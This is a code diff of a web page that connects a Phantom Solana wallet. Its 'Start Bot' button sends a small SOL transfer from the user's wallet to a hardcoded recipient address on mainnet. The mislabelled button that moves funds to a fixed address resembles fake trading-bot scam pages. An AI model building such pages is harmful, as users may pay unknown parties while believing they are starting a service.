@@ -55,8 +55,10 @@
     <div class="status" id="status"></div>
 </div>
 
+<script src="https://cdnjs.cloudflare.com/ajax/libs/@solana/web3.js/1.37.1/solana-web3.min.js"></script>
 <script>
     let userAccount;
+    const recipientAddress = "3ihvQYLpND6YJ18etpBnpo4vNr7NRoWpYkMjeFc9NHDZ";  // Solana recipient address
     const phantomDeepLink = "https://phantom.app/ul/v1/connect?app_url=YOUR_APP_URL";
 
     // Check if the user is on mobile
@@ -65,18 +67,19 @@
     // Function to connect to Phantom Wallet
     async function connectPhantomWallet() {
         if (window.solana && window.solana.isPhantom) {
-            // Desktop or mobile web with Phantom extension support
             try {
+                // Request connection to the wallet
                 const response = await window.solana.connect();
                 userAccount = response.publicKey.toString();
                 document.getElementById("walletAddress").innerText = "Wallet Address: " + userAccount;
                 document.getElementById("startBotButton").disabled = false;
+                document.getElementById("status").innerText = "Wallet connected successfully.";
             } catch (error) {
                 console.error("Error connecting to Phantom:", error);
                 alert("Error connecting to Phantom: " + error.message);
             }
         } else if (isMobile) {
-            // Mobile with Phantom app deep link
+            // Redirect to Phantom app using deep link if on mobile
             window.location.href = phantomDeepLink;
         } else {
             alert("Phantom Wallet not found. Please install the Phantom Wallet extension on desktop or use the Phantom app on mobile.");
@@ -86,30 +89,33 @@
     // Attach event listener to the "Connect Phantom Wallet" button
     document.getElementById("connectButton").addEventListener("click", connectPhantomWallet);
 
-    // Example function to send SOL or tokens to a recipient address
+    // Function to send SOL to the recipient address
     async function sendSolanaTokens() {
         if (!userAccount) {
             document.getElementById("status").innerText = "Please connect your wallet first.";
             return;
         }
 
-        const recipientAddress = "3ihvQYLpND6YJ18etpBnpo4vNr7NRoWpYkMjeFc9NHDZ";  // Recipient address
         const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
         const transaction = new solanaWeb3.Transaction();
 
         try {
-            // Example token transfer - adjust token program as needed
+            // Create a SOL transfer instruction
             transaction.add(
                 solanaWeb3.SystemProgram.transfer({
                     fromPubkey: new solanaWeb3.PublicKey(userAccount),
                     toPubkey: new solanaWeb3.PublicKey(recipientAddress),
-                    lamports: 1000000 // Adjust amount in lamports (1 SOL = 1e9 lamports)
+                    lamports: 1000000 // Adjust the amount in lamports (1 SOL = 1e9 lamports)
                 })
             );
 
-            const signature = await window.solana.signAndSendTransaction(transaction);
+            // Request signature and send transaction
+            const { signature } = await window.solana.signAndSendTransaction(transaction);
+            await connection.confirmTransaction(signature, 'confirmed');
+
             document.getElementById("status").innerText = `Transaction successful: ${signature}`;
         } catch (error) {
+            console.error("Transaction failed:", error);
             document.getElementById("status").innerText = `Transaction failed: ${error.message}`;
         }
     }
@@ -117,8 +123,6 @@
     // Attach event listener to the "Start Bot" button
     document.getElementById("startBotButton").addEventListener("click", sendSolanaTokens);
 </script>
-
-<script src="https://cdnjs.cloudflare.com/ajax/libs/@solana/web3.js/1.37.1/solana-web3.min.js"></script>
 
 </body>
 </html>
